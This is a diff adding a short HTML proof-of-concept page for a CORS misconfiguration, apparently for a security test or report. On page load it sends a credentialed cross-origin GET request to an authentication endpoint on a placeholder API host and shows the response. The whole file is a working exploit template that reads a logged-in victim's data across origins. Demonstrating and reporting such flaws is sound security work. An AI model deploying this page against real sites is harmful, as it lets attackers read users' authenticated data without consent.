@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CORS GET PoC</title>
+  <script>
+    function corsExploit() {
+      var xhr = new XMLHttpRequest();
+
+      xhr.onreadystatechange = function () {
+        if (xhr.readyState === 4) {
+          document.getElementById("output").innerHTML =
+            "<pre>" + xhr.responseText + "</pre>";
+        }
+      };
+
+      xhr.open(
+        "GET",
+        "https://api.example.com/auth/fetchLoginConfig?param=value",
+        true
+      );
+
+      xhr.withCredentials = true;
+      xhr.send();
+    }
+  </script>
+</head>
+
+<body onload="corsExploit()">
+  <center>
+    <h2>CORS Misconfiguration PoC (GET)</h2>
+    <p>Demonstrates credentialed cross-origin data access</p>
+
+    <div id="output"></div>
+
+    <button onclick="corsExploit()">Re-run PoC</button>
+  </center>
+</body>
+</html>
